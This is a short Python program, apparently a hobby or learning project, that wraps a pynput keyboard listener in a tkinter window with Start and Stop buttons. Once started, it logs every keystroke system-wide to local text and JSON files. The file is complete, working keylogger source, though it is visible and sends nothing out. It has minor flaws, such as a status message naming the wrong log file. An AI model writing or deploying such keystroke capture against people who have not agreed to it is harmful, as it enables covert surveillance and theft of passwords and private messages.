
import tkinter as tk
from tkinter import *
from pynput import keyboard
import json

keys_used = []
flag = False
keys = ""

def generate_text_log(key):
    with open('key_log.txt', "w+") as keys:
        keys.write(key)

def generate_json_file(keys_used):
    with open('key_log.json', '+wb') as key_log:
        key_list_bytes = json.dumps(keys_used).encode()
        key_log.write(key_list_bytes)

def on_press(key):
    global flag, keys_used, keys
    if flag == False:
        keys_used.append(
            {'Pressed': f'{key}'}
        )
        flag = True

    if flag == True:
        keys_used.append(
            {'Held': f'{key}'}
        )
    generate_json_file(keys_used)


def on_release(key):
    global flag, keys_used, keys
    keys_used.append(
        {'Released': f'{key}'}
    )

    if flag == True:
        flag = False
    generate_json_file(keys_used)

    keys = keys + str(key)
    generate_text_log(str(keys))

def start_keylogger():
    global listener
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    label.config(text="[+] Keylogger is running!\n[!] Saving the keys in 'keylogger.txt'")
    start_button.config(state='disabled')
    stop_button.config(state='normal')

def stop_keylogger():
    global listener
    listener.stop()
    label.config(text="Keylogger stopped.")
    start_button.config(state='normal')
    stop_button.config(state='disabled')


# Initialize the main window
root = Tk()
root.title("Keylogger")
root.geometry("300x200")
root.resizable(False, False)

# Create and place the main frame
main_frame = Frame(root, padx=10, pady=10)
main_frame.pack(expand=True)

# Create and place the label
label = Label(main_frame, text='Click "Start" to begin keylogging.', font=('Arial', 12))
label.pack(pady=10)

# Create and place the button frame
button_frame = Frame(main_frame)
button_frame.pack(pady=10)

# Create and place the start button
start_button = Button(button_frame, text="Start", command=start_keylogger, font=('Arial', 10), width=10)
start_button.pack(side=LEFT, padx=5)

# Create and place the stop button
stop_button = Button(button_frame, text="Stop", command=stop_keylogger, font=('Arial', 10), width=10, state='disabled')
stop_button.pack(side=RIGHT, padx=5)

# Create and place the status label
status_label = Label(main_frame, text="", font=('Arial', 10), fg='green')
status_label.pack(pady=10)

# Start the main loop
root.mainloop()